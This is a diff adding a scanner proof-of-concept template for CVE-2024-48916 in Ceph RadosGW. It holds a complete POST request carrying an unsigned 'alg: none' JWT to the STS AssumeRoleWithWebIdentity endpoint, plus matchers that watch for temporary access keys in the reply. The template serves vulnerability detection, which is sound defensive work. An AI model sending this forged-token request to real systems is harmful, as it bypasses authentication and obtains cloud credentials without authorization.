@@ -1,0 +1,39 @@
+[info]
+author = "AVE"
+description = "检测 Ceph RadosGW OIDC JWT 签名验证绕过漏洞。通过发送 alg 为 none 的恶意 JWT 令牌到 STS AssumeRoleWithWebIdentity 端点，验证是否可绕过身份认证。"
+id = "POC-AVE-2024-0538"
+name = "CVE-2024-48916 PoC"
+severity = "high"
+tags = ["ave-2024-0538"]
+vuln_id = [
+    "CVE-2024-48916",
+    "GHSA-5g9m-mmp6-93mq",
+    "AVE-2024-0538",
+]
+
+[poc]
+logic = "any"
+
+[[poc.requests]]
+method = "POST"
+path = "/{{BaseURL}}/"
+protocol = "http"
+
+[poc.requests.body]
+content = "Action=AssumeRoleWithWebIdentity&DurationSeconds=3600&RoleArn=arn:aws:iam::000000000000:role/test&RoleSessionName=poc&Version=2011-06-15&WebIdentityToken=eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiJ0ZXN0IiwiaXNzIjoiaHR0cHM6Ly9pZHAuZXhhbXBsZS5jb20iLCJpYXQiOjE1MTYyMzkwMjJ9."
+type = "raw"
+
+[poc.requests.headers]
+Content-Type = "application/x-www-form-urlencoded"
+User-Agent = "aws-sdk-go-v2/1.18.0"
+
+[[poc.requests.matchers]]
+expect = true
+part = "body"
+type = "word"
+words = [
+    "Credentials",
+    "AccessKeyId",
+    "SecretAccessKey",
+    "AssumeRoleWithWebIdentityResponse",
+]
